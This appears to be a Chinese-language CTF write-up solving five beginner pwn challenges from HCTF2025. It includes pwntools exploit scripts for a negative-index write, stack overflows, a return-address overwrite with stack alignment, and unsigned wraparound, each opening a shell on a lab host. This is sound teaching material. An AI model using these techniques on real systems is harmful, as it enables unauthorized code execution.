---
title: HCTF2025 第一阶段 PWN 题解
published: 2026-10-09
pinned: false
image: "api"
slug: /hctf2025-pwn-week1
tags: ["Pwn", "CTF"]
category: CTF
draft: false
lang: ""
description: "这是山东大学HCTF2025 第一阶段五道PWN方向题目的个人题解，涉及整数比较绕过、数组负下标越界写、栈溢出改写相邻变量、覆盖返回地址时的栈对齐，以及无符号整数的负数表示。"
descriptionSource: manual
---

## HCTF2025 第一阶段

大龄网安人挑战 pwn 方向，俺要成为 ctf 糕手！(

### 题目1：Doomsday

放到 IDA 里面反汇编一下，看到如下所示的 C 伪代码，里面含有 `system("/bin/sh")`，这是通过系统调用的方法启动一个 shell，我们的目的就是拿到 shell。

```c
if ( (unsigned int)__isoc99_scanf("%d", &v5) == 1 )
{
  while ( getchar() != 10 );
  if ( v5 > 4 )
  {
    if ( v5 == 85988116 )
    {
      puts("You've found your crush, and you'll survive the apocalypse with your partner. Congratulations");
      system("/bin/sh");
      continue;
    }
```

根据代码可知，要执行 `system("/bin/sh")`，必须使得 `v5` 这个变量大于 4 且赋值为 85988116（十进制）。那如何将其赋值呢？注意到前面有一行赋值输入 `__isoc99_scanf("%d", &v5)`，这段话的意思是说通过 scanf 读取用户输入，`%d` 表示读取一个十进制整数，最后赋值给 `v5` 中。

那么答案就很显然了，我们只需要在程序要求输入时输入 85988116 即可，虽然游戏菜单提示输入 0-4，但它并没有对输入进行校验。

![](https://img.remit.ee/i/zfr8ln671190)

### 题目2：HP & Dumbledore's Army

继续使用 IDA 反汇编，看到有个 `loop` 函数，点进去发现有个 switch 条件分支语句，它判断的是 `v0` 的值然后跳转到相应的分支里，可以看到当 `v0` 等于 5 时会跳转到一个名为 `dumbledore` 的函数，继续点击该函数，终于发现了 `system("/bin/sh")`。

具体看看这个 `dumbledore` 函数，核心逻辑如下。它只有当 `passwd` 等于 218 且 `s1` 字符串的值为 `Dumbledore's Army` 时才会获取 shell。其中 `strcmp` 为字符串比较函数，当比较相等时返回 0。那我们如何将 `passwd` 赋值为 218 且 `s1` 赋值为 `Dumbledore's Army` 呢？

```c
if ( (unsigned __int8)passwd == 218 && !strcmp(s1, "Dumbledore's Army") )
	system("/bin/sh");
else
	puts("Nothing happens. Maybe the words weren't quite right...");
```

我们先返回 `loop` 函数里去寻找，首先我们得让 `v0` 的值为 5 才能跳转到相应的分支，通过下面这个伪代码可以知道，在显示菜单后输入 5 即可。

```c
menu();
fgets(s, 9, stdin);
__isoc99_sscanf(s, "%d", &v0);
puts(&byte_226F);
switch ( v0 )
```

观察程序的布局情况，发现 `passwd`、`s1`、`members` 这几个变量在 bss 段上连续。所以是否可以考虑通过溢出的方式来修改字符串 `s1` 的值呢？

![](https://img.remit.ee/i/Y7AYnEA71Kob)

答案是可以的！因为 switch 条件分支语句的 case1 里存在导致栈溢出的漏洞，伪代码如下。它首先从标准输入中提取并赋值给变量 `s`，然后通过 `atoi` 函数赋值给 `v3`，其中 `atoi` 表示**把字符串转换成 `int` 整数**，不会做范围检查，代码里也没有额外的非法输入检测；最后使用 `fgets` 把名字读入 `members` 数组中第 `v3` 个位置处，其中每个位置占 33 字节，第一个字节是标记位，将该位置设置为 0。

```c
  case 1:
    printf("Choose a slot (0-%d): \n", 7);
    fgets(s, 10, stdin);
    v3 = atoi(s);
    puts("Ink your name carefully: ");
    fgets(&members[33 * v3 + 1], 32, stdin);
    members[33 * v3] = 0;
    break;
```

由于没有对 `v3` 进行范围检查，我们可以使其为负数，然后在计算 `33 * v3 + 1` 时就会指向 `members` 数组**之前**的内存，向前覆盖到 `passwd` 和 `s1`。

根据之前查看地址布局知道，`passwd` 起始地址为 `0x4060`，占 1 个字节；`s1` 地址 `0x4061`，占 63 字节；`members` 数组地址是 `0x40a0`，占 264 字节。计算可知，当 `v3` 为 -2 时，`33 * (-2) + 1 = -65`，于是写入的起始地址为 `0x40a0 + (-65) = 0x405f`，这个地址刚好是 `0x4060` 的前一个字节。

```text
0x405f <- name[0]
0x4060 <- name[1]  覆盖 passwd
0x4061 <- name[2]  开始覆盖 s1
```

我们目标是：

- `passwd` 赋值为 218，即 `name[1]` 处写入 `0xDA`（十进制 218）
- `s1` 也就是 `name[2]` 开始赋值为 `Dumbledore's Army`，最后还要增加多一个字符 `0x00` 保证 `strcmp` 成立
- `name[0]` 随便赋值个什么都行，比如 `0x00`

总的流程就是：进入 case1，输入 -2，输入构造的 payload，进入 case5。

```python
from pwn import *

p = remote('10.102.32.141', 49428)

p.sendline(b'1')
p.sendline(b'-2')
p.sendline(b"\x00\xdaDumbledore's Army\x00")
p.sendline(b'5')

p.interactive()
```

![](https://img.remit.ee/i/3u8j9n2iLCHw)

### 题目3：HP & The Chamber of Secrets

~~（感觉 wp 还是写简洁点不然太费时间）~~

老样子反汇编一下，发现当字符串 `v3` 值为 `parseltongue` 时执行 `system("/bin/sh")`，就得看 `v3` 是如何被赋值的。

核心代码如下，它生成伪随机数后读取**20 个字节**（0x15u）到 `v3` 中，然后将 `v3[20]` 设置为 0，这意味着 `v3` 里的内容每次运行都是随机的。

```c
stream = fopen("/dev/urandom", "rb");
if ( stream )
{
	fread(v3, 1u, 0x15u, stream);
	fclose(stream);
}
v3[20] = 0;
```

我们如何绕过随机生成的限制而使得 `v3` 固定为我们想要的值呢？我们看到了给变量 `s` 赋值时出现严重的漏洞：`s` 大小只有 **64 字节**，但是 `fgets` 函数允许读取的最大长度却是 **85 字节**，从而很自然地想到栈溢出的方法。

```c
char s[64]; // [rsp+10h] [rbp-60h]
fgets(s, 85, stdin);
```

查看变量在栈上的布局，发现它们确实紧邻，于是可以构造 payload，首先填充 `s`，然后赋值 `v3` 为 `parseltongue`，即 `payload = b'A' * 64 + b'parseltongue\x00'`。

```text
  FILE *stream;
  char s[64];           [rbp-60h]，占 64 字节，用户输入
  char v3[24];          [rbp-20h]，占 24 字节，随机值
  unsigned __int64 v4;
```

```python
from pwn import *

p = remote('10.102.32.141', 25669)

payload = b'A' * 64 + b'parseltongue\x00'
p.sendline(payload)

p.interactive()
```

![](https://img.remit.ee/i/bNpc8mmQJb9L)

### 题目4：HP: Magic Spell

或许，你也喜欢 Harry Potter 吗——当然，最近又二刷了一遍书，第一次看应该是四五年前了……

好了，依旧 IDA 反汇编，这次有个 `vuln` 函数，点击进去还有一个 `get_n` 函数，但是并不像之前的题目那样有明显的逻辑能跳转到 `system("/bin/sh")` 中。而在 IDA 里我们能够看到存在有一个 `backdoor` 函数，`backdoor` 里就是 `system("/bin/sh")`，我们要怎么用这个函数呢？

还是先审代码，核心漏洞点在 `get_n()`：`i` 从 0 开始不断减小，每次循环读取一个字符，把输入倒着写回目标地址，导致可以覆盖 `get_n()` 自己的返回地址。

```c
_BYTE *get_n(__int64 a1, int a2)
{
    for ( i = 0; i > -a2; --i )
    {
        v3 = getchar();
        if ( v3 == 10 )
            break;
        *(_BYTE *)(a1 + i) = v3;
    }

    result = (_BYTE *)(i + a1);
    *result = 0;
    return result;
}
```

在软件安全/汇编与逆向这两门课学到，函数调用时会先将返回地址（即当前下一条指令的地址）压入栈中，随后执行被调函数的函数序言。函数执行完毕后，通过函数尾声恢复调用者的栈帧，最后由 `ret` 指令从栈中弹出返回地址并跳转到该处继续执行。那么我的思路就是：修改返回地址，使得函数结束后跳转到 `backdoor` 函数并执行。

但是跳坑就跳在这里……它这个程序的 `get_n()` 是从高地址往低地址写，而我们课上学到的 save RIP 一般都在高地址吧，所以就是不是无法往高地址覆盖掉 save RIP 呢。于是就在这里卡了好久。

后来才发现，`a1` 这个变量是定义在 `vuln` 里的，不是在 `get_n()` 定义，只是它在 `get_n()` 被修改所以想当然觉得它也位于 `get_n()` 的栈帧里了。既然定义在 `vuln` 里，它当然能往下覆盖掉调用 `get_n` 时压入的返回地址啊！

```text
高地址
vuln 的返回地址
vuln 的 saved rbp
vuln 的局部变量 v1      get_n 的写入位置
...
vuln 调用 get_n 时压入的返回地址 rip  这里是我们需要覆盖的地方
get_n 的 saved rbp
低地址
```

`backdoor` 函数位于 `0x40125c`，`v1` 位于 `[rbp-11h]` 处，而调用 `get_n()` 后的返回地址位于 `[rbp-28h]` 处，中间 16 字节需要进行填充；由于是大端字节序，所以要将 payload 中的返回地址逆序。

此外还需要考虑栈对齐的问题：最终通过 `backdoor()` 调用 `system("/bin/sh")`，而 x86-64 Linux 调用约定要求函数入口处 `rsp % 16 == 8`，或在执行 `call` 前满足 `rsp % 16 == 0`，否则可能导致程序崩溃；在 `get_n()` 返回时，如果直接返回到 `backdoor()` 开头，`push rbp` 会把栈指针再下移 8 字节，有可能导致后续对齐错误，因此我们可以直接返回到 `backdoor + 8` 即 `0x401264`，跳过 `push rbp`，使 `call system` 前的栈状态满足对齐要求。

```python
from pwn import *

p = remote('10.102.32.141', 49836)

backdoor = 0x401264  # 这里的 0x401264 就是 backdoor + 8
payload = b'A' * 16 + p64(backdoor)[::-1]
p.sendline(payload)

p.interactive()
```

![](https://img.remit.ee/i/CdHJxfpzmGzv)

### 题目5：Rescue the princess

当变量 `v4` 的值为 -30 时，且菜单输入值为 1 时，会执行 `system("/bin/sh")`；但 `v4` 是一个 unsigned int 的类型，表示恶龙的血量，它是一个无符号数，怎么才能使其变为 -30 呢？

当 `v4` 和 -30 比较时，-30 的无符号整数表示为 `0xFFFFFFE2`，也就是说其实只需要将 `v4` 赋值为 `0xFFFFFFE2` 即可，`0xFFFFFFE2` 的十进制表示是 4294967266。且比较是在攻击后比较，所以攻击前将血量赋值为`4294967266+1=4294967267`。

```python
from pwn import *

p = remote('10.102.32.141', 26804)

p.sendline(b"4294967267")
p.sendline(b"1")
p.interactive()
```

![](https://img.remit.ee/i/6C0SwYNb4Znf)
